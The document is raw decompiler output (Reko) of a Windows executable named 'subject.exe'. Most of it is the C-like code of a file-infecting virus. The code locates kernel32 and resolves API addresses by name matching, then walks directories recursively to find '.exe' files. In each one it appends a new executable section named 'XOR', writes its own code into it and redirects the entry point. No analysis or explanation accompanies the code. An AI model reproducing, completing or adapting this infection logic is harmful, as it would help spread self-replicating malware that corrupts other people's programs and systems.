// subject_000001BD.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

<anonymous> * __imp__CloseHandle = &g_t20C4; // 00402000
<anonymous> * __imp__WriteFile = &g_t20D1; // 00402004
<anonymous> * __imp__CreateFileA = &g_t20DC; // 00402008
<anonymous> * __imp__SizeofResource = &g_t20E9; // 0040200C
<anonymous> * __imp__LockResource = &g_t20F9; // 00402010
<anonymous> * __imp__LoadResource = &g_t2107; // 00402014
<anonymous> * __imp__FindResourceA = &g_t2115; // 00402018
<anonymous> * __imp__GetModuleHandleA = &g_t2124; // 0040201C
<anonymous> * __imp__CopyFileA = &g_t2136; // 00402020
<anonymous> * __imp__lstrcatA = &g_t2141; // 00402024
<anonymous> * __imp__GetWindowsDirectoryA = &g_t214B; // 00402028
<anonymous> * __imp__GetModuleFileNameA = &g_t2161; // 0040202C
<anonymous> * __imp__GetProcAddress = &g_t2175; // 00402030
<anonymous> * __imp__LoadLibraryA = &g_t2185; // 00402034
<anonymous> * __imp__GetTickCount = &g_t2193; // 00402038
<anonymous> * __imp__GetLastError = &g_t21A1; // 0040203C
<anonymous> * __imp__CreateMutexA = &g_t21AF; // 00402040
word32 g_dw402070 = 8388; // 00402070
word32 g_dw402074 = 0x20D1; // 00402074
word32 g_dw402078 = 0x20DC; // 00402078
word32 g_dw40207C = 0x20E9; // 0040207C
word32 g_dw402080 = 8441; // 00402080
word32 g_dw402084 = 8455; // 00402084
word32 g_dw402088 = 0x2115; // 00402088
word32 g_dw40208C = 8484; // 0040208C
word32 g_dw402090 = 0x2136; // 00402090
word32 g_dw402094 = 0x2141; // 00402094
word32 g_dw402098 = 0x214B; // 00402098
word32 g_dw40209C = 0x2161; // 0040209C
word32 g_dw4020A0 = 8565; // 004020A0
word32 g_dw4020A4 = 8581; // 004020A4
word32 g_dw4020A8 = 8595; // 004020A8
word32 g_dw4020AC = 0x21A1; // 004020AC
word32 g_dw4020B0 = 0x21AF; // 004020B0
// subject_XOR.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00412000: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	Eq_2 eax;
	word32 ecx;
	ui32 dwArg00;
	g_dw4125CC = g_dw4125D0;
	struct Eq_10 * esi_149 = dwArg00 & ~0x0FFF;
	while (esi_149->w0000 != 23117)
		esi_149 -= 0x1000;
	g_ptr4125C4 = esi_149;
	struct Eq_15 * esi_41 = g_ptr4125C4 + esi_149->dw003C / 0x00001000;
	if (esi_41->w0000 == 0x4550)
	{
		g_dw4125C8 = g_ptr4125C4 + esi_41->dw0078 / 0x00001000;
		ptr32 esi_48 = 4269524;
		do
		{
			union Eq_42 * esi_50 = esi_48 + 4 + 0x01;
			word32 edx_54;
			word32 eax_52 = fn004120C4(esi_50, &g_t412000, out edx_54);
			esi_50->u1.dwFFFFFFFC = eax_52;
			do
				esi_50 = (union Eq_42 *) &esi_50->u0;
			while (esi_50->u0 != 0x00);
			esi_48 = (char *) esi_50 + 1;
		} while (esi_50->u1.b0005 != 0x00);
		struct Eq_74 * esp_85;
		word32 eax_86;
		word32 ecx_87;
		word32 edx_88;
		g_ptr412641();
		g_dw4126FF = eax_86;
		esp_85->dwFFFFFFFC = g_dw4126FF;
		word32 eax_96;
		word32 ecx_97;
		word32 edx_98;
		g_ptr412651();
		g_dw4126FB = eax_96;
		struct Eq_93 * esp_102;
		word32 eax_103;
		g_ptr41266F();
		g_dw4126DF += eax_103;
		word32 ecx_113;
		word32 edx_114;
		word32 eax_111 = fn00412560(&g_t412000, out ecx_113, out edx_114);
		esp_102->dwFFFFFFFC = g_dw4126FF;
		g_ptr412660();
	}
	return eax;
}

// 004120C4: Register int32 fn004120C4(Register (ptr32 Eq_42) esi, Register (ptr32 Eq_66) edi, Register out Eq_67 edxOut)
// Called from:
//      Win32CrtStartup
int32 fn004120C4(union Eq_42 * esi, struct Eq_66 * edi, union Eq_67 & edxOut)
{
	byte * ebx_21 = edi->ptr05C8->dw000C + edi->dw05C4;
	ui32 edx_10 = 0x00;
	while (true)
	{
		union Eq_42 * esi_16 = esi;
		do
		{
			byte ah_22 = *ebx_21;
			byte al_20 = esi_16->u0;
			esi_16 = (union Eq_42 *) ((char *) esi_16 + 1);
			++ebx_21;
			byte ah_48 = ah_22;
			if (SEQ(ah_22, al_20) == 0x00)
			{
				int32 eax_37 = edi->dw05C4;
				Eq_67 edx_41 = (word32) (edi->ptr05C8->ptr0024 + eax_37)[edx_10 - 0x01];
				int32 eax_45 = eax_37 + ((edi->ptr05C8)->ptr001C + eax_37)[edx_41];
				edxOut = edx_41;
				return eax_45;
			}
		} while (al_20 == ah_22);
		++edx_10;
		while (ah_48 != 0x00)
		{
			ah_48 = *ebx_21;
			++ebx_21;
		}
	}
}

// 0041212C: Register (ptr32 Eq_66) fn0041212C(Register Eq_190 esi, Register (ptr32 Eq_66) edi)
// Called from:
//      fn004123C9
struct Eq_66 * fn0041212C(Eq_190 esi, struct Eq_66 * edi)
{
	struct Eq_191 * esp_8;
	ui32 eax_9;
	edi->ptr06B1();
	esp_8->dwFFFFFFFC = eax_9;
	esp_8->tFFFFFFF8.u1 = (struct Eq_1089 *) esi;
	esp_8->dwFFFFFFF4 = eax_9 & ~0x01;
	esp_8->tFFFFFFF0.u1 = (struct Eq_1089 *) esi;
	struct Eq_210 * esp_26;
	edi->ptr06C8();
	esp_26->dwFFFFFFFC = 0x02;
	esp_26->tFFFFFFF8.u1 = (struct Eq_1089 *) esi;
	struct Eq_221 * esp_36;
	Eq_190 eax_37;
	edi->ptr05D4();
	if (eax_37 != ~0x00)
	{
		edi->t06EB.u1 = (struct Eq_1089 *) eax_37;
		esp_36->dwFFFFFFFC = 0x00;
		esp_36->dwFFFFFFF8 = 0x00;
		esp_36->tFFFFFFF4.u1 = edi->t06EB.u1;
		struct Eq_248 * esp_52;
		edi->ptr0602();
		esp_52->dwFFFFFFFC = 0x40;
		Eq_190 esi_315 = edi->t06FB.u1;
		esp_52->tFFFFFFF8.u1 = (struct Eq_1089 *) esi_315;
		esp_52->tFFFFFFF4.u1 = edi->t06EB.u1;
		word32 eax_67;
		struct Eq_270 * esp_113;
		edi->ptr05DF();
		if (eax_67 == 0x40 && *esi_315 == 23117)
		{
			struct Eq_66 * eax_76 = esi_315.u1[60];
			edi->ptr06F7 = eax_76;
			esp_113->tFFFFFFFC.u1 = (struct Eq_1089 *) 0x02;
			esp_113->ptrFFFFFFF8 = null;
			esp_113->tFFFFFFF4.u1 = edi->t06EB.u1;
			struct Eq_311 * esp_85;
			uint32 eax_86;
			edi->ptr0602();
			edi->dw06EF = eax_86;
			esp_85->dwFFFFFFFC = 0x00;
			esp_85->ptrFFFFFFF8 = edi->ptr06F7;
			esp_85->tFFFFFFF4.u1 = edi->t06EB.u1;
			struct Eq_335 * esp_100;
			edi->ptr0602();
			esp_100->dwFFFFFFFC = 0xE0;
			esp_100->tFFFFFFF8.u1 = (struct Eq_1089 *) esi_315;
			esp_100->tFFFFFFF4.u1 = edi->t06EB.u1;
			word32 eax_114;
			edi->ptr05DF();
			if (eax_114 == 0xE0 && *esi_315 == 0x4550)
			{
				esp_113->tFFFFFFFC.u1 = (struct Eq_1089 *) 0x00;
				esp_113->ptrFFFFFFF8 = edi->ptr06F7;
				esp_113->tFFFFFFF4.u1 = edi->t06EB.u1;
				struct Eq_379 * esp_131;
				edi->ptr0602();
				word32 eax_138 = (word32) esi_315.u1[84] - edi->ptr06F7;
				esp_131->dwFFFFFFFC = eax_138;
				esp_131->tFFFFFFF8.u1 = (struct Eq_1089 *) esi_315;
				esp_131->tFFFFFFF4.u1 = edi->t06EB.u1;
				word32 eax_148;
				edi->ptr05DF();
				if (eax_148 == (word32) (esi_315.u1)[84] - edi->ptr06F7)
				{
					word32 ecx_157 = (word32) esi_315.u1[6];
					word32 ecx_158 = ecx_157;
					if (ecx_157 != 0x00)
					{
						struct Eq_425 * ebx_163 = (word32) esi_315 + 0x00F8;
						up32 edx_164 = 0x00;
						do
						{
							if (ebx_163->dw0000 == 0x00524F58)
								goto l004123B6;
							word32 eax_172 = ebx_163->dw0008;
							word32 eax_173 = eax_172;
							if (eax_172 == 0x00)
								eax_173 = ebx_163->dw0010;
							up32 eax_182 = eax_173 + ebx_163->dw000C;
							if (eax_182 > edx_164)
								edx_164 = eax_182;
							++ebx_163;
							--ecx_158;
						} while (ecx_158 != 0x00);
						uint64 edx_eax_198 = (uint64) edx_164;
						uint32 eax_205 = (uint32) (edx_eax_198 /u (esi_315.u1)[56]);
						if ((uint32) (edx_eax_198 % (esi_315.u1)[56]) != 0x00)
							++eax_205;
						uint32 eax_217 = esi_315.u1[56] *32 eax_205;
						edi->dw06F3 = eax_217;
						edi->dw05D0 = esi_315.u1[40] - edi->dw06F3;
						esi_315.u1[40] = (struct Eq_1089) eax_217;
						uint64 edx_eax_230 = (uint64) (edi->dw06F3 + 0x0800);
						uint32 eax_233 = (uint32) (edx_eax_230 /u (esi_315.u1)[56]);
						if ((uint32) (edx_eax_230 % (esi_315.u1)[56]) != 0x00)
							++eax_233;
						uint32 eax_245 = esi_315.u1[56] *32 eax_233;
						if (esi_315.u1[80] < eax_245)
							esi_315.u1[80] = (struct Eq_1089) eax_245;
						else
							esi_315.u1[80] = (struct Eq_1089) ((word32) esi_315.u1[80].dw00D0 + 0x0730);
						ui32 ebx_254 = (word32) esi_315.u1[6];
						esi_315.u1[6] = (struct Eq_1089) ((byte) esi_315.u1[6].b0000 + 1);
						int32 ebx_258 = (ebx_254 << 0x03) + 0xF8 + (ebx_254 << 0x03) * 0x04;
						if ((word32) esi_315.u1[84] - edi->ptr06F7 >= ebx_258 + 0x28)
						{
							uint64 edx_eax_270 = (uint64) edi->dw06EF;
							Eq_575 ebx_267 = esi_315.u1 + ebx_258;
							uint32 eax_273 = (uint32) (edx_eax_270 /u (esi_315.u1)[60]);
							if ((uint32) (edx_eax_270 % (esi_315.u1)[60]) != 0x00)
								++eax_273;
							edi->dw06EF = esi_315.u1[60] *32 eax_273;
							if (esi_315.u1[0x00D0] != 0x00)
							{
								esp_113->tFFFFFFFC.u1 = (struct Eq_1089 *) esi_315;
								esp_113->ptrFFFFFFF8 = edi;
								word32 edi_302 = Mem300[esi_315 + 84:word32] + esi_315;
								word32 ecx_305;
								Eq_743 esi_307 = edi_302 - 40;
								for (ecx_305 = edi_302 - ebx_267; ecx_305 != 0x00; --ecx_305)
								{
									edi_302.u1->b0000 = esi_307.u1->b0000;
									--esi_307;
									--edi_302;
								}
								&esi_315.u1->b0000 = esp_113->tFFFFFFFC.u1;
								edi = esp_113->ptrFFFFFFF8;
								esi_315.u1[0x00D0] = (struct Eq_1089) esi_315.u1[0x00D0].dw0028;
							}
							&ebx_267->u1->b0000 = 0x00524F58;
							ebx_267.u1[4] = (struct Eq_1090) 0x00;
							ebx_267.u1[8] = (struct Eq_1090) 0x0800;
							ebx_267.u1[0x0C] = (struct Eq_1090) edi->dw06F3;
							ebx_267.u1[16] = (struct Eq_1090) 0x0800;
							uint32 edx_329 = edi->dw06EF;
							ebx_267.u1[20] = (struct Eq_1090) edx_329;
							ebx_267.u1[24] = (struct Eq_1090) 0x00;
							ebx_267.u1[28] = (struct Eq_1090) 0x00;
							ebx_267.u1[32] = (struct Eq_1090) 0x00;
							ebx_267.u1[36] = (struct Eq_1090) 0xC0000060;
							esp_113->tFFFFFFFC.u1 = (struct Eq_1089 *) 0x00;
							esp_113->ptrFFFFFFF8 = edi->ptr06F7;
							esp_113->tFFFFFFF4.u1 = edi->t06EB.u1;
							struct Eq_665 * esp_354;
							edi->ptr0602();
							word32 eax_361 = (word32) esi_315.u1[84] - edi->ptr06F7;
							esp_354->dwFFFFFFFC = eax_361;
							esp_354->tFFFFFFF8.u1 = (struct Eq_1089 *) esi_315;
							esp_354->tFFFFFFF4.u1 = edi->t06EB.u1;
							struct Eq_690 * esp_370;
							edi->ptr05EA();
							esp_370->dwFFFFFFFC = 0x00;
							esp_370->dwFFFFFFF8 = edi->dw06EF;
							esp_370->tFFFFFFF4.u1 = edi->t06EB.u1;
							struct Eq_710 * esp_384;
							edi->ptr0602();
							esp_384->dwFFFFFFFC = 0x0800;
							esp_384->ptrFFFFFFF8 = edi;
							esp_384->tFFFFFFF4.u1 = edi->t06EB.u1;
							edi->ptr05EA();
						}
					}
				}
			}
		}
l004123B6:
		esp_113->tFFFFFFFC.u1 = edi->t06EB.u1;
		edi->ptr05F6();
	}
	edi->ptr06C8();
	return edi;
}

// 004123C9: void fn004123C9(Register (ptr32 Eq_66) edi)
// Called from:
//      fn004123C9
//      fn00412560
void fn004123C9(struct Eq_66 * edi)
{
	struct Eq_775 * esp_21;
	word32 eax_22;
	edi->ptr0641();
	esp_21->dwFFFFFFFC = eax_22;
	struct Eq_783 * esp_30;
	struct Eq_784 * eax_31;
	edi->ptr0651();
	byte * esi_36 = esp_30->ptr0000;
	byte * ebx_38 = esp_30->ptr0004;
	struct Eq_784 * edx_316 = eax_31;
	while (true)
	{
		byte al_43 = *esi_36;
		++esi_36;
		if (al_43 == 0x00)
			break;
		edx_316->b0000 = al_43;
		++edx_316;
	}
	byte * ebx_51 = ebx_38;
	if (ebx_38 != null)
	{
		while (true)
		{
			byte al_58 = *ebx_51;
			++ebx_51;
			if (al_58 == 0x00)
				break;
			edx_316->b0000 = al_58;
			++edx_316;
		}
	}
	edx_316->b0000 = (byte) 0x5C;
	byte * edx_311 = eax_31 + 0x00001000;
	struct Eq_784 * esi_75 = eax_31;
	byte * ebx_79 = (char *) &edi->t06DF + 8;
	while (true)
	{
		byte al_82 = esi_75->b0000;
		++esi_75;
		if (al_82 == 0x00)
			break;
		*edx_311 = al_82;
		++edx_311;
	}
	do
	{
		byte al_91 = *ebx_79;
		*edx_311 = al_91;
		++ebx_79;
		++edx_311;
	} while (al_91 != 0x00);
	esp_30->ptr0004 = (byte *) (eax_31 + 0x00002000);
	esp_30->ptr0000 = (byte *) (eax_31 + 0x00001000);
	word32 eax_120;
	struct Eq_874 * esp_119;
	edi->ptr060E();
	eax_125 = eax_120;
	while (true)
	{
		word32 eax_125;
		if (eax_125 == 0x00)
			break;
		if (fn0041253E(0x05, edi) == 0x00)
		{
			if ((eax_31[0x00002000] & 0x10) == 0x10)
			{
				if (eax_31[0x0000202C] != 0x2E)
					fn004123C9(edi);
			}
			else
			{
				struct Eq_921 * esi_176 = eax_31 + 0x0000202C;
				while (esi_176->b0000 != 0x2E || esi_176[1] != 101 && esi_176[1] != 0x45 || (esi_176[2] != 0x78 && esi_176[2] != 88 || (esi_176[3] != 101 && esi_176[3] != 0x45 || esi_176[4] != 0x00)))
				{
					if (esi_176->b0000 == 0x00)
						goto l00412510;
					++esi_176;
				}
				Eq_190 edx_205 = edi->t06FB.u1;
				struct Eq_784 * esi_210 = eax_31;
				byte * ebx_211 = eax_31 + 0x0000202C;
				while (true)
				{
					byte al_214 = esi_210->b0000;
					++esi_210;
					if (al_214 == 0x00)
						break;
					edx_205.u1->b0000 = al_214;
					&edx_205.u1->b0000 = (word32) edx_205 + 1;
				}
				do
				{
					byte al_223 = *ebx_211;
					edx_205.u1->b0000 = al_223;
					++ebx_211;
					&edx_205.u1->b0000 = (word32) edx_205 + 1;
				} while (al_223 != 0x00);
				edi = fn0041212C(edi->t06FB.u1, edi);
			}
		}
l00412510:
		struct Eq_900 * esp_283 = esp_119 - 4;
		esp_283->dw0000 = eax_31 + 0x00002000;
		esp_283->dwFFFFFFFC = eax_120;
		edi->ptr0621();
	}
	esp_119->dwFFFFFFFC = eax_120;
	struct Eq_882 * esp_141;
	edi->ptr0633();
	esp_141->dwFFFFFFFC = eax_22;
	edi->ptr0660();
}

// 0041253E: Register uint32 fn0041253E(Register uint32 eax, Register (ptr32 Eq_66) edi)
// Called from:
//      fn004123C9
uint32 fn0041253E(uint32 eax, struct Eq_66 * edi)
{
	edi->t06DF.u0 = (int32) (edi->t06DF.u0 *s 1103515245 + 0x3039);
	return SLICE(edi->t06DF.u0 *64 eax, word32, 32);
}

// 00412560: Register word32 fn00412560(Register (ptr32 Eq_66) edi, Register out ptr32 ecxOut, Register out ptr32 edxOut)
// Called from:
//      Win32CrtStartup
word32 fn00412560(struct Eq_66 * edi, ptr32 & ecxOut, ptr32 & edxOut)
{
	struct Eq_1037 * esp_10;
	word32 eax_101;
	ptr32 ecx_102;
	ptr32 edx_103;
	edi->ptr0680();
	fn004123C9(edi);
	esp_10->dwFFFFFFFC = 0x1000;
	esp_10->tFFFFFFF8.u1 = edi->t06FB.u1;
	edi->ptr0699();
	fn004123C9(edi);
	fn004123C9(edi);
	fn004123C9(edi);
	fn004123C9(edi);
	ecxOut = ecx_102;
	edxOut = edx_103;
	return eax_101;
}

struct Eq_10 * g_ptr4125C4 = &g_t77E80000; // 004125C4
word32 g_dw4125C8 = 2012046400; // 004125C8
word32 g_dw4125CC = ~0x00010C46; // 004125CC
word32 g_dw4125D0 = ~0x00010E76; // 004125D0
<anonymous> * g_ptr412641 = &g_t77E9911A; // 00412641
<anonymous> * g_ptr412651 = &g_t77E8CCA3; // 00412651
<anonymous> * g_ptr412660 = &g_t77E9C287; // 00412660
<anonymous> * g_ptr41266F = &g_t77E8C0A6; // 0041266F
word32 g_dw4126DF = 226373697; // 004126DF
word32 g_dw4126FB = 0x00074738; // 004126FB
word32 g_dw4126FF = 0x00074738; // 004126FF
